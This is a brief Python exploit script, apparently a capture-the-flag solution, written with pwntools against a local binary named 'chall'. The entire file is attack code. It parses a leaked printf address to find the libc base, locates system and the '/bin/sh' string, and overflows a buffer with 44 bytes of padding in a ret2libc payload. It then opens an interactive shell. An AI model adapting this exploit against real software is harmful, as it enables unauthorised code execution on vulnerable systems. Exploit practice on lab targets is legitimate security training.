#!/usr/bin/env python3
from pwn import *

#p = gdb.debug('./chall', gdbscript='b *vuln')
p = process('./chall')
libc = ELF('./libc.so.6')

printf_address = str(p.recv())[13:23]

log.warn('printf at : ' + printf_address)

printf_address = int(printf_address, 16)

padding = b'A'* 44

libc.address = printf_address - libc.symbols['printf']

system = libc.symbols['system']

bin_sh = next(libc.search(b'/bin/sh\0'))

ret_addr = b'AAAA'

log.warn('/bin/sh at : ' + str(hex(bin_sh)))

log.warn('system at : ' + str(hex(system)))

payload = flat(padding, system, ret_addr, bin_sh)

p.sendline(payload)

p.interactive()
